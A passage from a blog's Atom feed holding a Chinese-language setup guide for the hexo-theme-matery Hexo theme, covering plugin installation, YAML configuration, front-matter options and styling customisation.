function">install</span> hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml  <span class="token key atrule">field</span><span class="token punctuation">:</span> post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="中文链接转拼音（建议安装）"><a href="#中文链接转拼音（建议安装）" class="headerlink" title="中文链接转拼音（建议安装）"></a>中文链接转拼音（建议安装）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i hexo-permalink-pinyin --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">permalink_pinyin</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">separator</span><span class="token punctuation">:</span> <span class="token string">'-'</span> <span class="token comment"># default: '-'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（建议安装）"><a href="#文章字数统计插件（建议安装）" class="headerlink" title="文章字数统计插件（建议安装）"></a>文章字数统计插件（建议安装）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">postInfo</span><span class="token punctuation">:</span>  <span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">update</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">wordCount</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 设置文章字数统计为 true.</span>  <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 设置站点文章总字数统计为 true.</span>  <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 阅读时长.</span>  <span class="token key atrule">readCount</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 阅读次数.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加emoji表情支持（可选的）"><a href="#添加emoji表情支持（可选的）" class="headerlink" title="添加emoji表情支持（可选的）"></a>添加emoji表情支持（可选的）</h3><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <a href="https://npm.taobao.org/package/hexo-filter-github-emojis">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（<code>::</code>,例如：<code>:smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">githubEmojis</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">className</span><span class="token punctuation">:</span> github<span class="token punctuation">-</span>emoji  <span class="token key atrule">inject</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">styles</span><span class="token punctuation">:</span>  customEmojis<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后就可以在文章中对应位置看到你用<code>emoji</code>语法写的表情了。</p><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">hub</span><span class="token punctuation">:</span>  <span class="token key atrule">content</span><span class="token punctuation">:</span>  <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span>  <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span>  <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="添加-DaoVoice-在线聊天功能（可选的）"><a href="#添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="添加 DaoVoice 在线聊天功能（可选的）"></a>添加 <a href="http://www.daovoice.io/">DaoVoice</a> 在线聊天功能（可选的）</h3><p>前往 <a href="http://www.daovoice.io/">DaoVoice</a> 官网注册并且获取 <code>app_id</code>，并将 <code>app_id</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="添加-Tidio-在线聊天功能（可选的）"><a href="#添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="添加 Tidio 在线聊天功能（可选的）"></a>添加 <a href="https://www.tidio.com/">Tidio</a> 在线聊天功能（可选的）</h3><p>前往 <a href="https://www.tidio.com/">Tidio</a> 官网注册并且获取 <code>Public Key</code>，并将 <code>Public Key</code> 填入主题的 <code>_config.yml</code> 文件中。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱等的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;% if (theme.socialLink.github) &#123; %>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;%= theme.socialLink.github %><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fab fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>&lt;% &#125; %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，在主题的 <code>_config.yml</code> 配置文件中激活music配置即可：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># 是否在首页显示音乐</span><span class="token key atrule">music</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">title</span><span class="token punctuation">:</span>         <span class="token comment"># 非吸底模式有效</span>    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>    <span class="token key atrule">show</span><span class="token punctuation">:</span> 听听音乐  <span class="token key atrule">server</span><span class="token punctuation">:</span> netease   <span class="token comment"># require music platform: netease, tencent, kugou, xiami, baidu</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> playlist    <span class="token comment"># require song, playlist, album, search, artist</span>  <span class="token key atrule">id</span><span class="token punctuation">:</span> <span class="token number">503838841</span>     <span class="token comment"># require song id / playlist id / album id / search keyword</span>  <span class="token key atrule">fixed</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>      <span class="token comment"># 开启吸底模式</span>  <span class="token key atrule">autoplay</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>   <span class="token comment"># 是否自动播放</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'#42b983'</span>  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token string">'all'</span>       <span class="token comment"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  <span class="token key atrule">order</span><span class="token punctuation">:</span> <span class="token string">'random'</span>   <span class="token comment"># 音频循环顺序, 可选值: 'list', 'random'</span>  <span class="token key atrule">preload</span><span class="token punctuation">:</span> <span class="token string">'auto'</span>   <span class="token comment"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  <span class="token key atrule">volume</span><span class="token punctuation">:</span> <span class="token number">0.7</span>       <span class="token comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  <span class="token key atrule">listFolded</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token comment"># 列表默认折叠</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>server</code>可选<code>netease</code>（网易云音乐），<code>tencent</code>（QQ音乐），<code>kugou</code>（酷狗音乐），<code>xiami</code>（虾米音乐），</p><p><code>baidu</code>（百度音乐）。</p><p><code>type</code>可选<code>song</code>（歌曲），<code>playlist</code>（歌单），<code>album</code>（专辑），<code>search</code>（搜索关键字），<code>artist</code>（歌手）</p><p><code>id</code>获取方法示例: 浏览器打开网易云音乐，点击我喜欢的音乐歌单，浏览器地址栏后面会有一串数字，<code>playlist</code>的<code>id</code></p><p>即为这串数字。</p></blockquote><h3 id="添加note"><a href="#添加note" class="headerlink" title="添加note"></a>添加note</h3><blockquote><p><a href="https://blog.17lai.site/posts/cf0f47fd/#tag-note">演示</a></p></blockquote><h4 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% note [class] [no-icon] [summary] %&#125;Any content (support inline tags too).&#123;% endnote %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><code>[class]</code> : <em>Optional parameter.</em> Supported values: default | primary | success | info | warning | danger.</li><li><code>[no-icon]</code> : <em>Optional parameter.</em> Disable icon in note.</li><li><code>[summary]</code> : <em>Optional parameter.</em> Optional summary of the note.</li></ul><p>All parameters are optional.</p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% note %&#125;#### Header(without define class style)&#123;% endnote %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加button"><a href="#添加button" class="headerlink" title="添加button"></a>添加button</h3><blockquote><p><a href="https://blog.17lai.site/posts/cf0f47fd/#tag-button">演示</a></p></blockquote><h4 id="Usage-1"><a href="#Usage-1" class="headerlink" title="Usage"></a>Usage</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% button url, text, icon [class], [title] %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>or</p><pre class="line-numbers language-none"><code class="language-none">&#123;% btn url, text, icon [class], [title] %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>url</code> : Absolute or relative path to URL.</li><li><code>text</code> : Button text. Required if no icon specified.</li><li><code>icon</code> : Font Awesome icon name. Required if no text specified.</li><li><code>[class]</code> : <em>Optional parameter.</em> Font Awesome class(es): <code>fa-fw</code> | <code>fa-lg</code> | <code>fa-2x</code> | <code>fa-3x</code> | <code>fa-4x</code> | <code>fa-5x</code></li><li><code>[title]</code> : <em>Optional parameter.</em> Tooltip at mouseover.</li></ul><h4 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h4><pre class="line-numbers language-none"><code class="language-none">&#123;% button #, Text %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>hide</td><td><code>false</code></td><td>隐藏文章，如果<code>hide</code>值为<code>true</code>，则文章不会在首页显示</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>keywords</td><td>文章标题</td><td>文章关键字，SEO 时需要</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2">开源中国在线工具</a>、<a href="http://encode.chahuo.com/">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> typora<span class="token punctuation">-</span>vue<span class="token punctuation">-</span>theme主题介绍<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-07 09:25:00</span><span class="token key atrule">author</span><span class="token punctuation">:</span> 赵奇<span class="token key atrule">img</span><span class="token punctuation">:</span> /source/images/xxx.jpg<span class="token key atrule">top</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">hide</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">cover</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span class="token key atrule">coverImg</span><span class="token punctuation">:</span> /images/1.jpg<span class="token key atrule">password</span><span class="token punctuation">:</span> 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92<span class="token key atrule">toc</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">mathjax</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">summary</span><span class="token punctuation">:</span> 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要<span class="token key atrule">categories</span><span class="token punctuation">:</span> Markdown<span class="token key atrule">tags</span><span class="token punctuation">:</span>  <span class="token punctuation">-</span> Typora  <span class="token punctuation">-</span> Markdown<span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="效果截图"><a href="#效果截图" class="headerlink" title="效果截图"></a>效果截图</h2><p><img src="http://static.blinkfox.com/matery-20181202-1.png" alt="首页"></p><p><img src="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-7.png" alt="首页文章列表"></p><p><img src="http://static.blinkfox.com/matery-20181202-8.png" alt="首页文章列表"></p><h2 id="自定制修改"><a href="#自定制修改" class="headerlink" title="自定制修改"></a>自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="修改主题颜色"><a href="#修改主题颜色" class="headerlink" title="修改主题颜色"></a>修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span><span class="token selector">.bg-color</span> <span class="token punctuation">&#123;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right<span class="token punctuation">,</span> #4cbf30 0%<span class="token punctuation">,</span> #0f9d58 100%<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/* 动态切换背景颜色. */</span><span class="token punctuation">&#125;</span><span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 动态切换背景颜色. */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改-banner-图和文章特色图"><a href="#修改-banner-图和文章特色图" class="headerlink" title="修改 banner 图和文章特色图"></a>修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><h2 id="版本变更记录"><a href="#版本变更记录" class="headerlink" title="版本变更记录"></a>版本变更记录</h2><p>参见 <a href="https://github.com/blinkfox/hexo-theme-matery/blob/master/CHANGELOG.md">CHANGELOG.md</a></p><h2 id="更多部署方式"><a href="#更多部署方式" class="headerlink" title="更多部署方式"></a>更多部署方式</h2><blockquote><p>Jsdelivr 已经被封了，这两个可以加速访问快一点</p></blockquote><h3 id="vercel-部署"><a href="#vercel-部署" class="headerlink" title="vercel 部署"></a><a href="https://blog.17lai.site/posts/5311b619/#vercel-%E9%83%A8%E7%BD%B2">vercel 部署</a></h3><h3 id="cloudflare-Pages-部署"><a href="#cloudflare-Pages-部署" class="headerlink" title="cloudflare Pages 部署"></a><a href="https://blog.17lai.site/posts/5311b619/#cloudflare-Pages-%E9%83%A8%E7%BD%B2">cloudflare Pages 部署</a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;center&gt;hexo-theme-matery&lt;/center&gt;&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://hits.dwyl.io/blinkfox/hexo-theme-matery&quot;&gt;&lt;img src=&quot;http://hits.dwyl.io/blink</summary>
      
    
    
    
    <category term="个人" scheme="https://shierjinghuang.github.io/categories/%E4%B8%AA%E4%BA%BA/"/>
    
    
    <category term="Hexo" scheme="https://shierjinghuang.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>链路状态路由协议IS-IS</title>
    <link href="https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/"/>
    <id>https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/</id>
    <published>2023-03-26T06:58:35.000Z</published>
    <updated>2023-04-09T07:11:23.319Z</updated>
    
